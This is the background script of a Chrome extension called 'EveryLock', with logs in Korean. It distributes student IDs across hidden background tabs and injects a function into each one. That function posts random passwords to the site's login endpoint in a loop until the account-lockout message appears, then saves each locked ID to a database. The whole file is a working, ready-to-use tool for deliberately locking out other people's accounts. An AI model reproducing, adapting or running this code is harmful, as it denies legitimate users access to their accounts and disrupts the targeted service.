import { addLockedAccount } from '../js/database.js';
import { addLog } from '../js/logger.js';

let engineState = {
  status: "IDLE",
  activeTabs: []
};

// 확장 프로그램 설치/시작 시 진단 로그 기록
chrome.runtime.onInstalled.addListener(() => {
  addLog("EveryLock 확장 프로그램이 정상적으로 초기화되었습니다.", "success");
});

chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  if (request.action === "START_MULTITAB") {
    if (engineState.status === "RUNNING") {
      sendResponse({ status: "ALREADY_RUNNING" });
      addLog("경고: 이미 공격 엔진이 실행 중입니다.", "warn");
      return;
    }
    engineState.status = "RUNNING";
    addLog(`멀티탭 화력 제어 시작 (대상 수: ${request.targetIds.length}개)`, "info");
    launchMultiTabFirepower(request.targetIds, request.maxAttempts, request.concurrencyTabs, request.requestDelay);
    sendResponse({ status: "STARTED" });
  } else if (request.action === "STOP_MULTITAB") {
    engineState.status = "STOPPED";
    addLog("사용자에 의해 멀티탭 폭격이 중단되었습니다.", "warn");
    closeCreatedTabs();
    sendResponse({ status: "STOPPED" });
  } else if (request.action === "ACCOUNT_LOCKED") {
    addLockedAccount(request.userId, request.attempts)
      .then(() => {
        addLog(`[LOCKED] 학번 ${request.userId} 잠금 감지 및 DB 저장 성공! (${request.attempts}회 시도)`, "success");
      })
      .catch(err => {
        addLog(`[DB ERROR] ${err.message}`, "error");
      });
  }
});

async function launchMultiTabFirepower(targetIds, maxAttempts, concurrencyTabs, requestDelay) {
  try {
    const currentTabs = await chrome.tabs.query({ active: true, currentWindow: true });
    if (currentTabs.length === 0) {
      engineState.status = "ERROR";
      addLog("오류: 활성화된 기준 탭을 찾을 수 없습니다.", "error");
      return;
    }
    const targetUrl = currentTabs[0].url;

    const chunks = [];
    const chunkSize = Math.ceil(targetIds.length / concurrencyTabs);
    for (let i = 0; i < targetIds.length; i += chunkSize) {
      chunks.push(targetIds.slice(i, i + chunkSize));
    }

    engineState.activeTabs = [];

    for (let t = 0; t < chunks.length; t++) {
      if (engineState.status !== "RUNNING") break;
      const subIds = chunks[t];

      const newTab = await chrome.tabs.create({ url: targetUrl, active: false });
      engineState.activeTabs.push(newTab.id);
      addLog(`백그라운드 탭 생성 완료 (ID: ${newTab.id}, 할당 학번: ${subIds.length}개)`, "info");

      waitForTabComplete(newTab.id, 15000, async () => {
        if (engineState.status !== "RUNNING") return;
        try {
          await chrome.scripting.executeScript({
            target: { tabId: newTab.id },
            func: runDistributedAutomationInTab,
            args: [subIds, maxAttempts, requestDelay]
          });
        } catch (scriptErr) {
          addLog(`스크립트 주입 오류: ${scriptErr.message}`, "error");
        }
      });

      await new Promise(r => setTimeout(r, 500));
    }
  } catch (err) {
    addLog(`엔진 실행 중 오류 발생: ${err.message}`, "error");
    engineState.status = "ERROR";
  }
}

function waitForTabComplete(tabId, timeoutMs, callback) {
  let isDone = false;
  const timeoutTimer = setTimeout(() => {
    if (!isDone) {
      isDone = true;
      chrome.tabs.onUpdated.removeListener(listener);
      addLog(`탭 로딩 타임아웃 발생 (ID: ${tabId})`, "warn");
    }
  }, timeoutMs);

  const listener = (tid, info) => {
    if (tid === tabId && info.status === 'complete' && !isDone) {
      isDone = true;
      clearTimeout(timeoutTimer);
      chrome.tabs.onUpdated.removeListener(listener);
      setTimeout(callback, 1000);
    }
  };
  chrome.tabs.onUpdated.addListener(listener);
}

async function closeCreatedTabs() {
  for (const tid of engineState.activeTabs) {
    try {
      await chrome.tabs.remove(tid);
    } catch (e) {}
  }
  engineState.activeTabs = [];
}

function runDistributedAutomationInTab(subIds, maxAttempts, requestDelay) {
  if (window.__tabEngineRunning) return;
  window.__tabEngineRunning = true;

  (async () => {
    const ALPHABET = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    function getRandomPassword() {
      let pw = "";
      for (let i = 0; i < 8; i++) pw += ALPHABET.charAt(Math.floor(Math.random() * ALPHABET.length));
      return pw;
    }

    let hasEncodeObj = false;
    try {
      if (window.top_left_bg && typeof window.top_left_bg.epPassEncode === 'function') {
        hasEncodeObj = true;
      }
    } catch (e) {}

    for (let i = 0; i < subIds.length; i++) {
      const currentId = subIds[i];
      let attemptsDone = 0;
      let locked = false;

      while (!locked && attemptsDone < maxAttempts) {
        attemptsDone++;
        const userId = currentId;
        const password = getRandomPassword();
        let processedPassword = password;

        try {
          if (hasEncodeObj) processedPassword = window.top_left_bg.epPassEncode(password);
        } catch (e) {}

        const formData = new URLSearchParams();
        formData.append('userId', userId);
        formData.append('password', processedPassword);
        formData.append('username', userId);
        formData.append('langKnd', 'ko');

        try {
          const response = await fetch('/user/loginProcess.face', {
            method: 'POST',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8' },
            body: formData.toString()
          });

          const responseText = await response.text();
          const isReallyLocked = responseText.includes('계정이 잠겼습니다') || 
                                 responseText.includes('잠금 처리') || 
                                 responseText.includes('초과하였습니다');

          if (isReallyLocked) {
            locked = true;
            chrome.runtime.sendMessage({
              action: "ACCOUNT_LOCKED",
              userId: userId,
              attempts: attemptsDone
            });
            break;
          }
        } catch (err) {}

        if (requestDelay > 0) {
          await new Promise(r => setTimeout(r, requestDelay));
        }
      }
    }
    window.__tabEngineRunning = false;
  })();
}